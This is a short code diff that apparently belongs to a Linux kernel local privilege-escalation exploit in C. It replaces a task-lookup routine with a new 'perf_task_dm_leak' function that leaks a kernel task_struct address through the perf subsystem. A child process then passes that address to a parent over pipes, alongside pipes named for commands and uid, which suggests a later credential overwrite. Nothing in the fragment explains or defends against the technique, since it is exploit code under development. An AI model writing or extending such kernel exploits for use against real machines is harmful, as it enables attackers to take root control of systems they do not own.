@@ -8,6 +8,7 @@
 #include "common.h"
 #include "offsets.h"
 extern uintptr_t fp_helper_setup(uintptr_t value, uintptr_t target, pid_t *out_pid);
+extern uint64_t perf_task_dm_leak(void);
 #include <sys/ioctl.h>
 #include <sys/mman.h>
 #include <linux/perf_event.h>
@@ -572,7 +573,7 @@ struct child_pipes { int task_r, task_w, cmd_r, cmd_w, uid_r, uid_w; };
 
 static void child_main(struct child_pipes *p) {
   close(p->task_r); close(p->cmd_w); close(p->uid_r);
-  uintptr_t my_task = perf_find_task();
+  uintptr_t my_task = perf_task_dm_leak();
   write(p->task_w, &my_task, sizeof(my_task));
   close(p->task_w);
   if (!my_task) _exit(1);
